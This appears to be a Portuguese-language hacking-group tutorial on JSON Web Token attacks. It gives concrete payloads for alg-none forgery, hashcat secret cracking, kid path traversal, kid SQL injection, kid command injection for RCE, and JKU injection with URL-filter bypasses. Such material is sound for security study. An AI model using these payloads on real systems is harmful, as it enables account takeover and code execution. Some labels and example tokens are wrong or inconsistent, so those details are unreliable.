

<!DOCTYPE html>
<html lang="pt">
    <style>
    .ascii {
        color: black;
        padding: 30px;
        text-align: center;
        background-image: url('../../asciiart.png');
        background-repeat: no-repeat;
        background-position: center;
        background-color: black;
    }

    .nav {
        overflow: hidden;
        background-color: rgb(5, 5, 5);
    }
    
    .nav a {
        float: left;
        display: block;
        color: white;
        text-align: center;
        padding: 14px 16px;
        text-decoration: none;
        font-family: monospace;
    }
    
    .nav a:hover {
        background-color: rgb(160, 13, 197);
        color: white;
    }

    .card {
    color: #000;
    background-color: #aaa;
    padding: 20px;
    margin-top: 20px;
    }
    </style>
    <title>Paper: Ataques em JSON Web Token (JWT) - Amolo Hunters</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=1024">
    <meta name="viewport" content="width=1024">
    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
    <body style="background-color:black;">
        <div class="nav">
            <a href="../../index.html">Home</a>
            <a href="../../papers/">Papers</a>
            <a href="../../hacktivism/">Hacktivismo</a>
            <a href="../../members/">Membros</a>
        </div>
        <div class="ascii">
            <h1 style="color:black;" align="right">.</h1>
            <h1 style="color:black;" align="right">.</h1>
        </div>
        <h1 style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Ataques em JSON Web Token (JWT)</h1>
        <p style="line-height: normal; margin:unset; padding:unset; font-family:monospace; text-align:center; color:white;">Autores: @sniss e @americosmjr</p>
        <div>
                <pre style="color:white;">
                            JWT ATTACKS      

                              Sumário 
            ===========================================
                      1. Entendendo o JWT
                      2. Gerando JWT com Python
                      3. Javascript Object Sining Encryption
                      4. Parâmetros Interessantes
                      5. JWT Attacks
                      6. Considerações Finais
            ===========================================

              _
             | |       Hacker
             | |===( )   //////
             |_|   |||  | o o|                 system
                    ||| ( c  )                  ____
                     ||| \= /                  ||   \_
                      ||||||                   ||     |
                      ||||||                ...||__/|-"
                      ||||||             __|________|__
                        |||             |______________|
                        |||             || ||      || ||
                        |||             || ||      || ||
        ----------------|||-------------||-||------||-||-------
                        |__>            || ||      || ||





        (((((( Entendendo o JWT ))))))

        JWT ou JSON Web Tokens é um padrão para enviar dados em JSON usado para autenticação ou troca de informações entre sistemas, sendo armazenados no client-side, porém gerado no back-end.

        Ele consiste em 3 partes:



        Carga útil  (Header)
        Cabeçalho   (Payload)
        Assinatura  (Signature)

        As partes são separadas por '.', por exemplo, xxxxx.yyyyy.zzzzz

        Sendo eles codificados em base64url. 

        Observação: para decodificá-los, usamos o site jwt.io.





        **** Cabeçalho ****

        É composto pelo tipo de token (JWT) e o algoritmo que vai ser usado na assinatura, por exemplo, HS256.


        EX:


        { 

        "alg": "HS256", //algoritmo usado na assinatura
        "typ": "JWT" //tipo do token

        }




        **** Carga útil ****

        Onde são adicionados os dados do JWT, esses dados são inseridos em payload claims (reivindicações). São elas:


        Public claims: podem ser modificadas à vontade, porém, para evitar problemas, tem que ser definidas como URI ou de acordo com o IANA JWT Registry para evitar colisões.

        Private claims: são personalizadas, criadas para compartilhar informações entre reivindicações não registradas ou públicas.

        Registered claims: são um conjunto de reivindicações não obrigatórias, que servem para dar informações opcionais, como o identificador (sub), data de criação (iat) 


        EX:
        {
        "sub": "2232323323", //registered claim
        "name": "SNISS", //public claim
        "logged": true, 
        "iat": 1653000000 //registered claim
        }


        SPOILER: (Mesmo que esteja protegida contra modificações, podemos achar dados sensíveis dentro do JWT ou até mesmo quebrar a autenticação).



        **** Assinatura ****


        É a codificação da carga útil e do cabeçalho.

        Usamos o algoritmo de codificação setado no cabeçalho.

        Se for bem implementada, impede a alteração de usuários mal-intencionados no JWT.

        Ele se parece assim. Neste exemplo, estamos usando o algoritmo HS256:

        HS256(  
              base64UrlEncode(cabeçalho) + "." +
              base64UrlEncode(carga_util),
              chave_secreta)


        Estamos codificando o cabeçalho encodado em base64UrlEncode, concatenando com um ".", a carga útil encodado em base64UrlEncode com a chave secreta setada pelo dev.




        (((((( Gerando um JWT com Python ))))))

        Para gerarmos um JWT, temos que importar a lib JWT.

        Depois, vamos definir a carga útil (payload).

        Observação: não vamos precisar definir o cabeçalho, pois vamos setar o algoritmo de codificação quando criarmos a assinatura.

        Precisamos setar também uma chave para usarmos na assinatura.

        E depois, usamos a func jwt.encode para criarmos a nossa assinatura.



        Código:

        import jwt  # importando a biblioteca jwt 

        payload = {  # setando a carga útil 

              "name": "SNISS", #setando uma public claim   
                                                  
              "sub": "232342424",  #setando uma registered claim
            
              "admin": True 
        }


        secret_key = "AmoloHT123" #chave secreta para a assinatura


        jwt_signature = jwt.encode(payload, secret_key, algorithm="HS256") #criando uma assinatura com o algoritimo HS256, estamos juntando o paylod + o secret_key

        print(jwt_signature)

                          
            Output:
            
                  eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJhZG1pbiI6IHRydWUsICJuYW1lIjogIlNOSVNTIiwgInN1YiI6ICIyMzIzNDI0MjQiLCAidXNlciI6ICIxMjM0NTYifQ.Dsc0L-8Uew0R1MstxU7ofu1HlOj7Vg0C_9fEhOcRHQ8

                      
                      
                
                - como podemos observar, o jwt foi criado com sucesso e separado em 3 partes por '.':
                    
          
                                  eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9   - Cabeçalho
                                  
                                  eyJhZG1pbiI6IHRydWUsICJuYW1lIjogIlNOSVNTIiwgInN1YiI6ICIyMzIzNDI0MjQiLCAidXNlciI6ICIxMjM0NTYifQ -  Carga Útil 

                                  Dsc0L-8Uew0R1MstxU7ofu1HlOj7Vg0C_9fEhOcRHQ8 - Assinatura
                                  

                                  

        (((((( Javacript Object Sining Encription )))))


        O JWT sendo uma estrutura JSON, precisa ter especificações de como  criptografar e assinar digitalmente ele

        Essas especificações são chamadas de Javascript Object Singing Encription ou JOSE que é composto por:


        JWS 
        JWK
        JWA
        JWE

        Porém, vamos falar apenas sobre: JWS, JWE, JWK



        **** JWS ****

        Quando o JWT é assinado, ele se torna um JWS, assim garantindo a segurança do JWT
        Ou seja, o JWS nada mais é que o JWT assinado, toda parte de assinatura escrito anteriormente é a anatomia e formação do JWS.



        **** JWE ****


        O JWE é um JWT criptografado, por fins de mais segurança, ele é composto por: Header, AAD, initialization vector,  Cipher Text, Authentication Tag

        Todos encodados em base64Url


        Sendo o resultado final dele:
                  
                  Header.EncryptedKey.InitializationVector.CipherText.AuthenticationTag
                  
                  
        **** JWK ****

        é uma estrutura em json que vai ter um conjunto de chaves publicas com  a função de verificar a assinatura do JWT 


        EX: 

        {
        kty":"EC", 
        "crv":"P-256", 
        "x":"f83OJ3D2xF1Bg8vub9tLe1gHMzV76e8Tus9uPHvRVEU", 
        "y":"x_FEzRu9m36HLN_tue659LNpXW6pCyStikYjKIWI5a0", 
        "kid":"7770b085bf649b726b3574764030e1bde9a10ae6" 
        } 




        ((((((  Parametros interessantes ))))))



        **** KID ****

        kid ou Key id fornece o id da chave que vai ser usado para os servidores identificarem se a key está correta
        podendo ser ultilizado no cabeçalho do jwt ou no JWK, o usuario consegue modificar esse parâmetro .      
                


        **** JKU ****

        JKU ou JWK URL, Contém uma URL com um JWK publico de conteudo que vai ser usada para verificar a assinatura do JWT 


        Como funciona:
                      
                  1. User faz uma HTTP req com o JWT 
            
                  2 . Aplicação analisa o JWT e extrai o JKU

                  3. Depois de extraido, ela pega o JWK contido no JKU

                  4. Verifica a assinatura do JWT usando o JWK

                  5. Envia a response para o  User 





        ((((((  JWT Attacks )))))))
                                  
                                  

        Agora vamos para oque interessa !
                          
        Os ataques em JWT consistem em você conseguir modificar o JWT por completo ou até só um parametro ou claim 
        A fim de conseguir account takeover e privilege escalation ( na maioria dos casos)                        
        Em alguns casos conseguimos juntar essas vulnerabilidades para conseguir impactos maiores como um SQLi, SSRF, Insecurity Desserialization ou até um RCE
                
                
                
                
                [[[[[[ JWT None Attack ]]]]]]
                
                
        Esse ataque consiste em conseguimos modificar o parametro 'alg' do cabeçalho e colocarmos ele como none
                    
        Já que o 'alg' define o algoritimo usado na assinatura, quando botamos como 'none' indicamos que não vamos precisar de uma assinatura 
                    
        Assim, possibilitando modificar o jwt por completo sem precisar ter a secret key .
                    
                    
        Isto ocorre quando o servidor confia no JWT enviado pelo client-side, assim quando ele for ler vai ser indicado que esse JWT não precisa de uma assinatura.
                    
                    
                    
                    
        Observação ( no site jwt.io, não conseguimos modificar o jwt sem ter a secret key, então usamos a extensão do burp suite  'JWT Editor' para conseguirmos modifica-ló )
                    

                    
                    Ex:
                    
                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256"
                                  
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        -------- Ataque --------
                        
                                eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
                                
                                {
                                  "typ": "JWT",
                                  "alg": "none"  //modificado do algoritimo padrão para none
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // trocando o usuario a fim de aumentar o privilégio
                                  "iat": 1516239022
                                }
                                
                      
                      
                      
                      [[[[[[ Brute Force na secret key ]]]]]]
                      
                      
                      
          Em alguns algoritimos usados na assinatura como o HS256 permitem fazer brute force na secret key, pois eles usam strings autonomas e    arbitrarias.
          Se a secret key for fraca conseguimos adivinha-lá usando algumas wordlists, consequetemente conseguindo modificar o JWT assinado, podemos usar
          tools como hashcat para isso.
                          
                          
                        Ex:  
                                -------- JWT --------
                                    
                                    
        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJTTklTUyIsInN1YiI6IjIzMjM0MjQyNCJ9.eEH-kVtT3FfeTGWfBHt_mbVHqNtJo4STX-6Qa3OaTmE                                                           
                                    
                                  
                                Secret-Key: AmoloHT123                         
                      
                      
                      
                                {
                                    "alg": "HS256",
                                    "typ": "JWT"
                                }
                      
                      
                              {
                                    "admin": false,
                                    "name": "SNISS",
                                    "sub": "232342424"
                              }
                      
                      
                            
                            -------- Ataque --------

                              Com o hashcat, vamos indicar o jwt e uma wordlist para conseguirmos quebrar a secret key
                              
                              
                                ┌──(root㉿sniss)-[/home/sniss]
                                └─#  hashcat -m 16500 -a 0 jwt  wordlist.txt
                                
                              se for quebrado com sucesso, vamos ter o output
                                  
        eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6ZmFsc2UsIm5hbWUiOiJTTklTUyIsInN1YiI6IjIzMjM0MjQyNCJ9.eEH-kVtT3FfeTGWfBHt_mbVHqNtJo4STX-6Qa3OaTmE:AmoloHT123
                      
                      
                                conseguindo a senha AmoloHT123, vamos para o site jwt.io e colocar o jwt normal e a senha na aba 'Verify Signature'  
                                Se for efetuado com sucesso podemos alterar o parametro "admin" para true
                                
                                
                                JWT final: 
                                
                                                  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.T26Dm4buOBRdxNs58srk1l_N5y1Dxii9y-YMj-9J7mM
                                
                                
                                                                                
                                {
                                    "alg": "HS256",
                                    "typ": "JWT"
                                }
                      
                      
                              {
                                    "admin": true,  //alterado para true, assim conseguindo um privilege escalation
                                    "name": "SNISS",
                                    "sub": "232342424"
                              }
                      



                      [[[[[[ Path Traversal no KID ]]]]]]
                      
                      
          É possível explorar path traversal através do parâmetro kid, nesse contexto, o path traversal nos permite burlar o token jwt, fazendo que busque por um
          secret key com valor nulo, consequentemente conseguimos assinar um token utilizando um secret vazio, e assim o token é validado.

                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256",
                                  "kid": "1"
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        -------- Ataque --------
                        
                                eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZS
                                I6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyZlEuSflKxwRJSMeKKF2QT4fwpMeJf36POk6ySlZfadQssw5c
                                
                                {
                        "typ": "JWT",
                        "alg": "none",
                        "kid": "../../../../../../../../../../../../../../../../../../../dev/null"  //Payload path traversal para acessar o arquivo /dev/null
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // trocando o usuario a fim de aumentar o privilégio
                                  "iat": 1516239022
                                }

                                E por fim assinar o token usando uma secret key vazia

                                Ao fazer isso, o aplicativo tenta obter a assinatura via kid, para comparar essa
                                chave de assinatura com a chave de assinatura do token, mas o kid é nulo e a chave
                                de assinatura é nula, devido a isso, o JWT manipulado é validado.
                                Aliás, conseguimos modificar o payload do JWT e ele ainda está sendo validado.





                      [[[[[[ SQL Injection no KID ]]]]]]
                      
                      
                Injeção de SQL permitirá prever o valor retornado quando o aplicativo consultar o banco de dados. 
                Você pode usar muitos métodos de exploração, mas o Union Based permite que você retorne facilmente o valor que deseja.

                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256",
                                  "kid": "1"
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        --------- Ataque --------
                        
                                eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Inp6enp6enp6enp6enonIHVuaW9uIHNlbGVjdCAnYWFhIn0ueyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyZlEuSflKxwRJSMeKKF2QT4fwpMeJf36POk6ySlZfadQssw5c
                                
                                {
                                  "typ": "JWT",
                                  "alg": "none",
                                  "kid": "zzzzzzzzzzzzz' union select 'aaa"  // Payload de SQL Injection, para retornar da base de dados o valor 'aaa'
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // trocando o usuario a fim de aumentar o privilégio
                                  "iat": 1516239022
                                }

                                E por fim assinar o token usando a secret key 'aaa'

                                Neste código injetamos o payload no parâmetro kid, selecionando o texto 'aaa' do banco de dados,
                                após isso o kid retorna 'aaa' como chave de assinatura, e usamos esta chave para assinar o JWT,
                                e por fim ele é validado, permitindo para manipular o JWT e sequestrar sessões.





                      [[[[[[ RCE via KID ]]]]]]
                      
                      
                      O parâmetro `kid` é frequentemente usado para recuperar uma chave de:

                      - O sistema de arquivos
                      - Um banco de dados

                      O parâmetro `kid` é processado antes da verificação da assinatura, porque a assinatura precisa da chave recuperada por `kid`

                      Aplicações em Ruby, geralmente abrem arquivo de 2 formas, uma é através da função file.open() e a outra é kernel.open(),
                      kernel.open() vai executar o arquivo pelo nome do arquivo, se colocarmos um pipe | e logo após colocar um comando, conseguiremos
                      uma execução de código no sistema operativo da aplicação em ruby.


                        -------- JWT --------
                        
                            eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IjEifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                    
                              
                              {
                                  "typ": "JWT",
                                  "alg": "HS256",
                                  "kid": "1"
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "John Doe",
                                  "iat": 1516239022
                                }
                      
                      
                        -------- Ataque --------
                        
                                eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Inx0b3VjaCAvdG1wL3Rlc3QifS57InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjJmUS5J+UrHBElIx4ooXZBPh/Ckx4l/fo86TrJKVl9p1CyzDlw=
                                
                                {
                                  "typ": "JWT",
                                  "alg": "none",
                                  "kid": "|touch /tmp/test"  // Payload para criar um arquivo no diretório tmp
                                  
                              }
                              
                              
                              {
                                  "sub": "1234567890",
                                  "name": "admin",    // trocando o usuario a fim de aumentar o privilégio
                                  "iat": 1516239022
                                }

                                Dessa forma conseguimos executar comandos arbrtrarios no sistema operativo da aplicação.






                      [[[[[[ JKU Header Injection ]]]]]]


                          O ataque consiste em modificarmos a url do JKU para que o server obtenha um JWK malicioso
                          fazendo o atacante conseguir modificar o jwt já que o JWK é responsavel pela verificação da assinatura

                          Isso é possivel quando o dev não faz um filtro de urls permitidas dentro do jku
                          
                          porém quando a filtração é  baseada em 'starts with', conseguimos bypassar nas seguintes maneiras:
                                
                                          
                                          https://server.com@malicious.com
                                          
                                          https://malicious.com#server.com
                                            
                                          https://server.com:senhaaleatoria@malicious.com
                                          
                                          https://server.com/correct/open-redirect-vuln

                          
                              -------- JWT -------- 
                                  
                            eyJraWQiOiI3NzcwYjA4NWJmNjQ5YjcyNmIzNTc0NzY0MDMwZTFiZGU5YTEwYWU2IiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzbmlzcyIsImV4cCI6MTIzNDU2Nzg5MTB9.Zo5S6Z_lDu9TULpZsi7UcI8ujmfCIwrV_EQx1JayMfULAHsjIMx0k3RTToTR
                            dVckFjn42gSsn-jQHRkIw81xQtRIZFpp4_VDCk7htD-YqrKTE6vg0-tL9SXv5JBdskxMnyJ1Hioamj9NFx3mc9GIveXOx0MKwFuFtDA0Xfpo-PnSJAX_PemZGx1h8G-eY0Ehb20yA_9SH7n1P1b0gbIu790ximN5uLFNBABKCJOIVQJIiPgnQH2bMwfKoCYJ
                            gGQ3DTea3rVpTEmjOPBmt9GLePEvmsrwRePzw_-gWRYNFLqpsI1mvt8Dk5con82xtdhshmsE7M8mgv7lx08OZtwq_Q




                            {

                              "kid": "7770b085bf649b726b3574764030e1bde9a10ae6",
                              "alg": "RS256"

                              }

                              {
                                "sub": "sniss",
                                "exp": 12345678910

                              }
                          
                                  

                            -------- Ataque --------  


                          Observando o JWT, vemos que assinatura tem como algoritimo o RSA 
                        
                          Vamos gerar um RSA Key para usarmos, para isso vamos usar a extensão JWT Editor do burp e clicar na opção 'New RSA Key'

                          Após gerado vamos copiar a chave com a opção 'Copy Public Key as JWK' 
                          
                          Agora vamos bota-lá no nosso servidor malicioso OBS(bote no começo o { "keys": [ ) 

                                        
                                            { 
                                                  "keys": [
                                                    {
                                                        "kty": "RSA",
                                                        "e": "AQAB",
                                                        "kid": "eb11ab8f-37a5-46af-9d06-751f46edbc71",
                                                        "n": "svDTmO2huaHGpZ54i2hVvFDGkbdrSTHRmMo-SOIl3JrxgX08hO0Z-6RrMYNybEbPxlxhOYpXCj6a38YqmRNSUuvIWxZrFfehu2wcw6iEyjxp6V2-OOPAdT0epBJScdes..."
                                                      
                                                    }

                                                ]
                                            }
                                          

                        Com o Servidor pronto, vamos adicionar no header do JWT alvo o parametro 'jku' e vamos botar um filtro para contormamos o bypass

                                          "jku": "https://vulnerable.com#nosso-server.com/jwk"

                        Vamos modificar o "kid" original pelo valor do "kid" gerado por nós 

                                          "kid": "eb11ab8f-37a5-46af-9d06-751f46edbc71"

                        Por fim vamos assinar esse JWT com o nosso RSA gerado pela a extensão do burp, para isso apertamos em sign e selecionamos o nosso RSA



                            {

                              "kid": "eb11ab8f-37a5-46af-9d06-751f46edbc71", 
                              "alg": "RS256",
                              "jku": "https://vulnerable.com#nosso-server.com/jwk" 

                              }

                              {
                                "sub": "admin", //modificado
                                "exp": 12345678910

                              }
                                

                        Assim, conseguindo modificar o JWT por completo.





        ◣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  Considerações Finais ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◢

        O nosso paper termina por aqui, vimos como funciona um jwt, como cria-ló e como ataca-ló
        Até o próximo paper tchauuuuuu 


       ⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇         Beijos do SNISS e Américo
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                           
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀            
                </pre>                    
        </div>
    </body>
</html>
